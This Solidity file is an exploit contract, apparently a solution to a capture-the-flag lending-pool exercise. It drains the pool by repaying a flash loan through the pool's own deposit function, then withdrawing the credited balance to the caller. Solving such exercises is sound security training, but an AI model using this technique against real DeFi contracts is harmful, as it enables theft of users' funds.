// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract FlashLoanAttack {
    SideEntranceLenderPool _sideEntranceLenderPool;

    receive() external payable {}

    constructor(address _pool) {
        _sideEntranceLenderPool = SideEntranceLenderPool(_pool);
    }

    function attack(uint256 _amount) public payable {
        _sideEntranceLenderPool.flashLoan(_amount);
    }

    function execute() external payable {
        _sideEntranceLenderPool.deposit{value: msg.value}();
    }

    function withdraw() external returns (bool) {
        _sideEntranceLenderPool.withdraw();
        (bool success,) = (msg.sender).call{value: address(this).balance}("");

        return success;
    }
}
